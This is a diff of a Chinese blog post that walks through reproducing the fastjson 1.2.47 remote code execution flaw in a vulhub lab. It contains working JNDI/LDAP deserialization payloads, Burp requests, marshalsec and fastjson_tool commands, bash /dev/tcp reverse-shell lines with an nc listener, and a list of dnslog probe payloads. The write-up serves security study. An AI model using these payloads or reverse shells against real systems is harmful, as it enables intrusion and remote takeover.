@@ -119,27 +119,36 @@
 </ul>
 <h3 id="Centos7上执行操作"><a href="#Centos7上执行操作" class="headerlink" title="Centos7上执行操作"></a>Centos7上执行操作</h3><p>1、下载vulhub漏洞环境<br>git clone <a href="https://github.com/vulhub/vulhub.git" target="_blank" rel="noopener">https://github.com/vulhub/vulhub.git</a><br>2、安装docker、docker-compose<br>3、进入fastjson 1.2.47的目录<br>我这里是/root/vulhub-master/fastjson/1.2.47-rce</p>
 <p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson1.png" alt></p>
-<p>4、执行docker-compose build &amp;&amp; docker-compose up -d启动漏洞环境<br>5、访问漏洞环境<br><a href="http://192.168.96.128:8090/" target="_blank" rel="noopener">http://192.168.96.128:8090/</a></p>
-<h3 id="Kali上执行操作"><a href="#Kali上执行操作" class="headerlink" title="Kali上执行操作"></a>Kali上执行操作</h3><p>1、下载漏洞利用工具fastjson_rce_tool<br>Git clone <a href="https://github.com/wyzxxz/fastjson_rce_tool" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
+<p>4、执行docker-compose build &amp;&amp; docker-compose up -d启动漏洞环境<br>5、访问漏洞环境<br><a href="http://192.168.96.128:8090/" target="_blank" rel="noopener">http://192.168.96.128:8090/</a><br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson2.png" alt></p>
+<h3 id="Kali上执行操作"><a href="#Kali上执行操作" class="headerlink" title="Kali上执行操作"></a>Kali上执行操作</h3><p>1、下载漏洞利用工具fastjson_rce_tool<br>Git clone <a href="https://github.com/wyzxxz/fastjson_rce_tool" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson_rce_tool</a><br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson3.png" alt></p>
 <p>2、开启LDAP服务<br>java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.96.129 80 “bash=/bin/bash -i &gt;&amp; /dev/tcp/192.168.96.129/4444 0&gt;&amp;1”</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson4.png" alt></p>
 <p>bash=/bin/bash -i &gt;&amp; /dev/tcp/192.168.96.128/4444 0&gt;&amp;1为获取反弹shell的命令<br>（可参考<a href="https://blog.csdn.net/alex_seo/article/details/103393052）。" target="_blank" rel="noopener">https://blog.csdn.net/alex_seo/article/details/103393052）。</a></p>
 <p>3、开启nc监听端口<br>nc -nlvp 4444</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson5.png" alt></p>
 <h3 id="Windows10上执行操作"><a href="#Windows10上执行操作" class="headerlink" title="Windows10上执行操作"></a>Windows10上执行操作</h3><p>在Windows10的Burpsuite中执行以下请求：</p>
 <p>POST / HTTP/1.1<br>Host: 192.168.96.128:8090<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Type: application/json<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 186</p>
 <p>{“e”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://192.168.96.129:80/Object”,”autoCommit”:true} }</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson6.png" alt></p>
 <h3 id="Kali上查看结果"><a href="#Kali上查看结果" class="headerlink" title="Kali上查看结果"></a>Kali上查看结果</h3><p>1、Payload发送成功</p>
 <p>root@kali:~/fastjson_rce_tool# java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.96.129 80 “bash=/bin/bash -i &gt;&amp; /dev/tcp/192.168.96.129/4444 0&gt;&amp;1”<br>[-] payload:  {“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://192.168.96.129:80/Object”,”autoCommit”:true}<br>[-] payload:  {“e”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://192.168.96.129:80/Object”,”autoCommit”:true}}<br>[-] LDAP Listening on 0.0.0.0:80<br>[<em>] Send LDAP reference result for Object redirecting to <a href="http://192.168.96.129:80/Object.class" target="_blank" rel="noopener">http://192.168.96.129:80/Object.class</a><br>[</em>] Have connection from /192.168.96.128:57340 /Object.class<br>[-] remote target jdk version: java/1.8.0_102, use payload version: jdk8<br>[-] send payload done and exit.</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson7.png" alt></p>
 <p>2、Nc界面成功获取到shell</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson8.png" alt></p>
 <h3 id="Dnslog进行漏洞验证"><a href="#Dnslog进行漏洞验证" class="headerlink" title="Dnslog进行漏洞验证"></a>Dnslog进行漏洞验证</h3><h4 id="fastjson-tool工具验证"><a href="#fastjson-tool工具验证" class="headerlink" title="fastjson_tool工具验证"></a>fastjson_tool工具验证</h4><p>1、获取dnslog解析域名</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson9.png" alt></p>
 <p>2、提交命令执行<br>java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.96.129 80 “curl dhb8tq.dnslog.cn”</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson10.png" alt></p>
 <p>3、burpsuite请求<br>POST / HTTP/1.1<br>Host: 192.168.96.128:8090<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Type: application/json<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 186</p>
 <p>{“e”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://192.168.96.129:80/Object”,”autoCommit”:true} }</p>
 <p>4、dnslog获取命令执行（curl dhb8tq.dnslog.cn）结果</p>
-<p>5、fastjson_rce_tool看到成功执行payload</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson11.png" alt></p>
+<p>5、fastjson_rce_tool看到成功执行payload<br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson12.png" alt></p>
 <h4 id="Burpsuite验证"><a href="#Burpsuite验证" class="headerlink" title="Burpsuite验证"></a>Burpsuite验证</h4><p>使用以下请求快速验证：</p>
 <p>POST / HTTP/1.1<br>Host: 192.168.96.128:8090<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Type: application/json<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 66</p>
 <p>{“zeo”:{“@type”:”java.net.Inet4Address”,”val”:”tpj10e.dnslog.cn”} }</p>
-<p>Dnslog收到返回：</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson13.png" alt></p>
+<p>Dnslog收到返回：<br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson14.png" alt></p>
 <h4 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h4><p>{“@type”:”java.net.Inet4Address”, “val”:”dnslog”}<br>{“@type”:”java.net.Inet6Address”, “val”:”dnslog”}<br>{“@type”:”java.net.InetSocketAddress”{“address”:, “val”:”dnslog”} }<br>{“@type”:”com.alibaba.fastjson.JSONObject”, {“@type”: “java.net.URL”, “val”:”dnslog”} }””}<br>{ {“@type”:”java.net.URL”, “val”:”dnslog”}:”aaa”}<br>Set[{“@type”:”java.net.URL”, “val”:”dnslog”}]<br>Set[{“@type”:”java.net.URL”, “val”:”dnslog”}<br>{ {“@type”:”java.net.URL”, “val”:”dnslog”}:0</p>
 <h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>此方法使用方法一的环境未成功，经查找原因，是jdk版本原因导致，故将攻击机（kali）的jdk版本进行更换。</p>
 <h3 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>名称    操作系统    IP    版本    Java环境（java -version）<br>攻击机    Kali（VM虚拟机、NAT模式）    192.168.96.129    Linux version 4.19.0-kali4-amd64 (<a href="mailto:devel@kali.org">devel@kali.org</a>) (gcc version 8.3.0 (Debian 8.3.0-2)) #1 SMP Debian 4.19.28-2kali1 (2019-03-18)</p>
@@ -160,19 +169,23 @@
 <li>Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)</li>
 </ul>
 <h3 id="Kali上执行操作-1"><a href="#Kali上执行操作-1" class="headerlink" title="Kali上执行操作"></a>Kali上执行操作</h3><p>1、下载漏洞利用工具<br>Git clone <a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE.git" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE.git</a></p>
-<p>2、修改Exploit.java</p>
+<p>2、修改Exploit.java<br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson15.png" alt></p>
 <p>使用命令javac Exploit.java 编译Exploit.java，生成Exploit.class文件</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson16.png" alt></p>
 <p>4、开启ldap服务<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://192.168.96.129/#Exploit" target="_blank" rel="noopener">http://192.168.96.129/#Exploit</a></p>
-<p>5、开启web服务</p>
-<p>6、开启nc监听</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson17.png" alt></p>
+<p>5、开启web服务<br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson18.png" alt></p>
+<p>6、开启nc监听<br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson19.png" alt></p>
 <h3 id="Windows10上执行操作-1"><a href="#Windows10上执行操作-1" class="headerlink" title="Windows10上执行操作"></a>Windows10上执行操作</h3><p>POST / HTTP/1.1<br>Host: 192.168.96.128:8090<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Type: application/json<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 265</p>
 <p>{<br>    “a”:{<br>        “@type”:”java.lang.Class”,<br>        “val”:”com.sun.rowset.JdbcRowSetImpl”<br>    },<br>    “b”:{<br>        “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>        “dataSourceName”:”ldap://192.168.96.129:1389/Exploit”,<br>        “autoCommit”:true<br>    }<br>}</p>
-<h3 id="Kali上查看结果-1"><a href="#Kali上查看结果-1" class="headerlink" title="Kali上查看结果"></a>Kali上查看结果</h3><p>成功反弹shell：</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson20.png" alt></p>
+<h3 id="Kali上查看结果-1"><a href="#Kali上查看结果-1" class="headerlink" title="Kali上查看结果"></a>Kali上查看结果</h3><p>成功反弹shell：<br><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson21.png" alt></p>
 <h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h2><p>当攻击者请求以下数据包<br>POST / HTTP/1.1<br>Host: 192.168.96.128:8090<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Type: application/json<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 265</p>
 <p>{<br>    “a”:{<br>        “@type”:”java.lang.Class”,<br>        “val”:”com.sun.rowset.JdbcRowSetImpl”<br>    },<br>    “b”:{<br>        “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>        “dataSourceName”:”ldap://192.168.96.129:1389/Exploit”,<br>        “autoCommit”:true<br>    }<br>}</p>
 <h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><p>靶机（受害者）的com.sun.rowset.JdbcRowSetImpl 这个类在设置 autoCommit 的 setter 时会调用 connect 方法去连接 dataSourceName 指定的 jdbc 服务。 JNDI 常用的有 RMI 和 LDAP 服务。</p>
 <h2 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h2><p>一旦靶机远程调用ldap://192.168.96.129:1389/Exploit，工具marshalsec-0.0.3-SNAPSHOT-all.jar会将该请求转发到攻击者的web服务（这里为：<a href="http://192.168.96.129/）【root@kali:~/fastjson-1.2.47-RCE#" target="_blank" rel="noopener">http://192.168.96.129/）【root@kali:~/fastjson-1.2.47-RCE#</a> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://192.168.96.129/#Exploit" target="_blank" rel="noopener">http://192.168.96.129/#Exploit</a><br>Listening on 0.0.0.0:1389<br>Send LDAP reference result for Exploit redirecting to <a href="http://192.168.96.129/Exploit.class" target="_blank" rel="noopener">http://192.168.96.129/Exploit.class</a><br>】</p>
 <h2 id="漏洞执行"><a href="#漏洞执行" class="headerlink" title="漏洞执行"></a>漏洞执行</h2><p>靶机通过web服务获取到攻击者web目录下的Exploit.class文件</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson22.png" alt></p>
 <p>最终靶机执行Exploit程序中的命令：/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.96.129/4444 0&gt;&amp;1，反弹shell到攻击者。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/124f06f4aace" target="_blank" rel="noopener">https://www.jianshu.com/p/124f06f4aace</a></p>
 
